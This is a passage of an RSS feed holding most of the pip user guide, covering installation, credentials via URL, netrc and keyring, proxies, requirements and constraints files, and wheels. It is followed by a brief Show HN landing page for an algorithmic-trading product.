<div><div><pre><span></span>python -m pip install SomePackage            <span># latest version</span>
python -m pip install <span>SomePackage</span><span>==</span><span>1</span>.0.4     <span># specific version</span>
python -m pip install <span>'SomePackage&gt;=1.0.4'</span>     <span># minimum version</span>
</pre></div>
</div>
</div>
<p><label for="tab-set--1-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install SomePackage            <span># latest version</span>
py -m pip install <span>SomePackage</span><span>==</span><span>1</span>.0.4     <span># specific version</span>
py -m pip install <span>'SomePackage&gt;=1.0.4'</span>     <span># minimum version</span>
</pre></div>
</div>
</div>
</div>
<p>For more information and examples, see the <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> reference.</p>
</div>
<div id="basic-authentication-credentials">
<h2>Basic Authentication Credentials<a href="#basic-authentication-credentials" title="Permalink to this headline">Â¶</a></h2>
<p>pip supports basic authentication credentials. Basically, in the URL there is
a username and password separated by <code><span>:</span></code>.</p>
<p><code><span>https://[username[:password]@]pypi.company.com/simple</span></code></p>
<p>Certain special characters are not valid in the authentication part of URLs.
If the user or password part of your login credentials contain any of the
special characters
<a href="https://en.wikipedia.org/wiki/Percent-encoding#Percent-encoding_reserved_characters">here</a>
then they must be percent-encoded. For example, for a
user with username â€œuserâ€ and password â€œhe//oâ€ accessing a repository at
pypi.company.com, the index URL with credentials would look like:</p>
<p><code><span>https://user:he%2F%2Fo@pypi.company.com</span></code></p>
<p>Support for percent-encoded authentication in index URLs was added in pip 10.0.0
(in <a href="https://github.com/pypa/pip/issues/3236">#3236</a>). Users that must use authentication
for their Python repository on systems with older pip versions should make the latest
get-pip.py available in their environment to bootstrap pip to a recent-enough version.</p>
<p>For indexes that only require single-part authentication tokens, provide the token
as the â€œusernameâ€ and do not provide a password, for example -</p>
<p><code><span>https://0123456789abcdef@pypi.company.com</span></code></p>
<div id="netrc-support">
<h3>netrc Support<a href="#netrc-support" title="Permalink to this headline">Â¶</a></h3>
<p>If no credentials are part of the URL, pip will attempt to get authentication credentials
for the URLâ€™s hostname from the userâ€™s .netrc file. This behaviour comes from the underlying
use of <a href="https://requests.readthedocs.io/en/master/user/authentication/#netrc-authentication">requests</a> which in turn delegates it to the <a href="https://docs.python.org/3/library/netrc.html">Python standard library</a>.</p>
<p>The .netrc file contains login and initialization information used by the auto-login process.
It resides in the userâ€™s home directory. The .netrc file format is simple. You specify lines
with a machine name and follow that with lines for the login and password that are
associated with that machine. Machine name is the hostname in your URL.</p>
<p>An example .netrc for the host example.com with a user named â€˜danielâ€™, using the password
â€˜qwertyâ€™ would look like:</p>
<div><div><pre><span></span>machine example.com
login daniel
password qwerty
</pre></div>
</div>
<p>As mentioned in the <a href="https://docs.python.org/3/library/netrc.html">standard library docs</a>,
only ASCII characters are allowed. Whitespace and non-printable characters are not allowed in passwords.</p>
</div>
<div id="keyring-support">
<h3>Keyring Support<a href="#keyring-support" title="Permalink to this headline">Â¶</a></h3>
<p>pip also supports credentials stored in your keyring using the <a href="https://pypi.org/project/keyring/">keyring</a>
library. Note that <code><span>keyring</span></code> will need to be installed separately, as pip
does not come with it included.</p>
<div><div><pre><span></span>pip install keyring
<span>echo</span> your-password <span>|</span> keyring <span>set</span> pypi.company.com your-username
pip install your-package --extra-index-url https://pypi.company.com/
</pre></div>
</div>
</div>
</div>
<div id="using-a-proxy-server">
<h2>Using a Proxy Server<a href="#using-a-proxy-server" title="Permalink to this headline">Â¶</a></h2>
<p>When installing packages from <a href="https://pypi.org/">PyPI</a>, pip requires internet access, which
in many corporate environments requires an outbound HTTP proxy server.</p>
<p>pip can be configured to connect through a proxy server in various ways:</p>
<ul>
<li><p>using the <code><span>--proxy</span></code> command-line option to specify a proxy in the form
<code><span>[user:passwd@]proxy.server:port</span></code></p></li>
<li><p>using <code><span>proxy</span></code> in a <a href="#config-file"><span>Config file</span></a></p></li>
<li><p>by setting the standard environment-variables <code><span>http_proxy</span></code>, <code><span>https_proxy</span></code>
and <code><span>no_proxy</span></code>.</p></li>
<li><p>using the environment variable <code><span>PIP_USER_AGENT_USER_DATA</span></code> to include
a JSON-encoded string in the user-agent variable used in pipâ€™s requests.</p></li>
</ul>
</div>
<div id="requirements-files">
<h2>Requirements Files<a href="#requirements-files" title="Permalink to this headline">Â¶</a></h2>
<p>â€œRequirements filesâ€ are files containing a list of items to be
installed using <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> like so:</p>
<div>
<p><label for="tab-set--2-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--2-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install -r requirements.txt
</pre></div>
</div>
</div>
</div>
<p>Details on the format of the files are here: <a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirements-file-format"><span>Requirements File Format</span></a>.</p>
<p>Logically, a Requirements file is just a list of <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> arguments
placed in a file. Note that you should not rely on the items in the file being
installed by pip in any particular order.</p>
<p>In practice, there are 4 common uses of Requirements files:</p>
<ol>
<li><p>Requirements files are used to hold the result from <a href="https://pip.pypa.io/en/latest/reference/pip_freeze/#pip-freeze"><span>pip freeze</span></a> for the
purpose of achieving <a href="#repeatability"><span>repeatable installations</span></a>.  In
this case, your requirement file contains a pinned version of everything that
was installed when <code><span>pip</span> <span>freeze</span></code> was run.</p>
<div>
<p><label for="tab-set--3-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip freeze &gt; requirements.txt
python -m pip install -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--3-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip freeze &gt; requirements.txt
py -m pip install -r requirements.txt
</pre></div>
</div>
</div>
</div>
</li>
<li><p>Requirements files are used to force pip to properly resolve dependencies.
pip 20.2 and earlier <a href="https://github.com/pypa/pip/issues/988">doesnâ€™t have true dependency resolution</a>, but instead simply uses the first
specification it finds for a project. E.g. if <code><span>pkg1</span></code> requires
<code><span>pkg3&gt;=1.0</span></code> and <code><span>pkg2</span></code> requires <code><span>pkg3&gt;=1.0,&lt;=2.0</span></code>, and if <code><span>pkg1</span></code> is
resolved first, pip will only use <code><span>pkg3&gt;=1.0</span></code>, and could easily end up
installing a version of <code><span>pkg3</span></code> that conflicts with the needs of <code><span>pkg2</span></code>.
To solve this problem, you can place <code><span>pkg3&gt;=1.0,&lt;=2.0</span></code> (i.e. the correct
specification) into your requirements file directly along with the other top
level requirements. Like so:</p>
<div><div><pre><span></span><span>pkg1</span>
<span>pkg2</span>
<span>pkg3</span><span>&gt;=</span><span>1.0</span><span>,</span><span>&lt;=</span><span>2.0</span>
</pre></div>
</div>
</li>
<li><p>Requirements files are used to force pip to install an alternate version of a
sub-dependency.  For example, suppose <code><span>ProjectA</span></code> in your requirements file
requires <code><span>ProjectB</span></code>, but the latest version (v1.3) has a bug, you can force
pip to accept earlier versions like so:</p>

</li>
<li><p>Requirements files are used to override a dependency with a local patch that
lives in version control.  For example, suppose a dependency
<code><span>SomeDependency</span></code> from PyPI has a bug, and you canâ€™t wait for an upstream
fix.
You could clone/copy the src, make the fix, and place it in VCS with the tag
<code><span>sometag</span></code>.  Youâ€™d reference it in your requirements file with a line like
so:</p>
<div><div><pre><span></span><span>git</span><span>+</span><span>https</span><span>:</span><span>//</span><span>myvcs</span><span>.</span><span>com</span><span>/</span><span>some_dependency</span><span>@sometag</span><span>#egg=SomeDependency</span>
</pre></div>
</div>
<p>If <code><span>SomeDependency</span></code> was previously a top-level requirement in your
requirements file, then <strong>replace</strong> that line with the new line. If
<code><span>SomeDependency</span></code> is a sub-dependency, then <strong>add</strong> the new line.</p>
</li>
</ol>
<p>Itâ€™s important to be clear that pip determines package dependencies using
<a href="https://setuptools.readthedocs.io/en/latest/setuptools.html#declaring-dependencies">install_requires metadata</a>,
not by discovering <code><span>requirements.txt</span></code> files embedded in projects.</p>
<p>See also:</p>
<ul>
<li><p><a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirements-file-format"><span>Requirements File Format</span></a></p></li>
<li><p><a href="https://pip.pypa.io/en/latest/reference/pip_freeze/#pip-freeze"><span>pip freeze</span></a></p></li>
<li><p><a href="https://caremad.io/2013/07/setup-vs-requirement/">â€œsetup.py vs requirements.txtâ€ (an article by Donald Stufft)</a></p></li>
</ul>
</div>
<div id="constraints-files">
<h2>Constraints Files<a href="#constraints-files" title="Permalink to this headline">Â¶</a></h2>
<p>Constraints files are requirements files that only control which version of a
requirement is installed, not whether it is installed or not. Their syntax and
contents is nearly identical to <a href="#requirements-files"><span>Requirements Files</span></a>. There is one key
difference: Including a package in a constraints file does not trigger
installation of the package.</p>
<p>Use a constraints file like so:</p>
<div>
<p><label for="tab-set--4-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install -c constraints.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--4-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install -c constraints.txt
</pre></div>
</div>
</div>
</div>
<p>Constraints files are used for exactly the same reason as requirements files
when you donâ€™t know exactly what things you want to install. For instance, say
that the â€œhelloworldâ€ package doesnâ€™t work in your environment, so you have a
local patched version. Some things you install depend on â€œhelloworldâ€, and some
donâ€™t.</p>
<p>One way to ensure that the patched version is used consistently is to
manually audit the dependencies of everything you install, and if â€œhelloworldâ€
is present, write a requirements file to use when installing that thing.</p>
<p>Constraints files offer a better way: write a single constraints file for your
organisation and use that everywhere. If the thing being installed requires
â€œhelloworldâ€ to be installed, your fixed version specified in your constraints
file will be used.</p>
<p>Constraints file support was added in pip 7.1. In <a href="#resolver-changes-2020"><span>Changes to the pip dependency resolver in 20.3 (2020)</span></a> we did a fairly comprehensive overhaul, removing several
undocumented and unsupported quirks from the previous implementation,
and stripped constraints files down to being purely a way to specify
global (version) limits for packages.</p>
</div>
<div id="installing-from-wheels">
<h2>Installing from Wheels<a href="#installing-from-wheels" title="Permalink to this headline">Â¶</a></h2>
<p>â€œWheelâ€ is a built, archive format that can greatly speed installation compared
to building and installing from source archives. For more information, see the
<a href="https://wheel.readthedocs.io/">Wheel docs</a> , <span id="index-0"></span><a href="https://www.python.org/dev/peps/pep-0427"><strong>PEP 427</strong></a>, and <span id="index-1"></span><a href="https://www.python.org/dev/peps/pep-0425"><strong>PEP 425</strong></a>.</p>
<p>pip prefers Wheels where they are available. To disable this, use the
<a href="https://pip.pypa.io/en/latest/reference/pip_install/#install-no-binary"><span>--no-binary</span></a> flag for <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a>.</p>
<p>If no satisfactory wheels are found, pip will default to finding source
archives.</p>
<p>To install directly from a wheel archive:</p>
<div>
<p><label for="tab-set--5-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install SomePackage-1.0-py2.py3-none-any.whl
</pre></div>
</div>
</div>
<p><label for="tab-set--5-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install SomePackage-1.0-py2.py3-none-any.whl
</pre></div>
</div>
</div>
</div>
<p>For the cases where wheels are not available, pip offers <a href="https://pip.pypa.io/en/latest/reference/pip_wheel/#pip-wheel"><span>pip wheel</span></a> as a
convenience, to build wheels for all your requirements and dependencies.</p>
<p><a href="https://pip.pypa.io/en/latest/reference/pip_wheel/#pip-wheel"><span>pip wheel</span></a> requires the <a href="https://pypi.org/project/wheel/">wheel package</a> to be installed, which provides the
â€œbdist_wheelâ€ setuptools extension that it uses.</p>
<p>To build wheels for your requirements and all their dependencies to a local
directory:</p>
<div>
<p><label for="tab-set--6-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install wheel
python -m pip wheel --wheel-dir<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--6-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install wheel
py -m pip wheel --wheel-dir<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
</div>
<p>And <em>then</em> to install those requirements just using your local directory of
wheels (and not from PyPI):</p>
<div>
<p><label for="tab-set--7-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install --no-index --find-links<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--7-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install --no-index --find-links<span>=</span>â€¦</pre></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pip.pypa.io/en/latest/user_guide/#changes-to-the-pip-dependency-resolver-in-20-2-2020">https://pip.pypa.io/en/latest/user_guide/#changes-to-the-pip-dependency-resolver-in-20-2-2020</a></em></p>]]>
            </description>
            <link>https://pip.pypa.io/en/latest/user_guide/#changes-to-the-pip-dependency-resolver-in-20-2-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145396</guid>
            <pubDate>Thu, 19 Nov 2020 02:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Run professionally built algo-traders in 5 mins with 0 code]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25145239">thread link</a>) | @tjs8rj
<br/>
November 18, 2020 | https://areyouinterested.co/site/quantbase/ | <a href="https://web.archive.org/web/*/https://areyouinterested.co/site/quantbase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="hero-1"><p id="subheading">Deploy algorithms from top hedge funds,<br> rank and use 100s of usersâ€™ algorithms,<br> or create new algo-traders effortlessly</p>

              <div id="interested">
                <h3>Are you interested?</h3>
                <div id="buttons">
                  <p><a href="https://areyouinterested.co/site/quantbase/yes" id="yes">Yes</a>
                  <a href="https://areyouinterested.co/site/quantbase/no" id="no">No</a>
                </p></div>
              </div>

            </div></div>]]>
            </description>
            <link>https://areyouinterested.co/site/quantbase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25145239</guid>
            <pubDate>Thu, 19 Nov 2020 01:38:24 GMT</pubDate>
        </item>
    </channel>
</rss>
